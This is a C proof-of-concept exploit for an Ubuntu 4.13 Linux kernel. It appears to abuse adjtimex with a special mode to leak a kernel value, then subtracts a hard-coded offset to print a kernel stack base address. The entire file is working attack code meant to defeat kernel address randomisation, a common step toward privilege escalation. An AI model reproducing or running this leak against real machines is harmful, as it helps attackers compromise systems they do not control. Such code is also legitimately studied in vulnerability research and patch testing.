#define _GNU_SOURCE
#define _BSD_SOURCE
#include <sys/timex.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <kptr-lib.h>

// Ubuntu 4.13.0-16-generic
// gcc -o poc poc.c -m32

struct timex time;

int main(int argc, char **argv)
{
	int r;
	unsigned long long stack_offset, kernel_base;
	unsigned int leak_value;
	unsigned int high = 0xffffffff;

	memset(&time, 0, sizeof(time));
	time.modes = 0x8000;

	mmap(0,0xa000,3,2022,-1,0);

	adjtimex(&time);
	leak_value = time.tai;
	printf("--> leak_value : %x\n", leak_value);

	memcpy(&kernel_base, &leak_value, 4);
	memcpy((char *)&kernel_base + 4, &high, 4);
	stack_offset = 0x1fc4a4;
	kernel_base = leak_value - stack_offset;
	printf("--> kernel_stack_base : %llx\n", kernel_base);

 	return 0;
}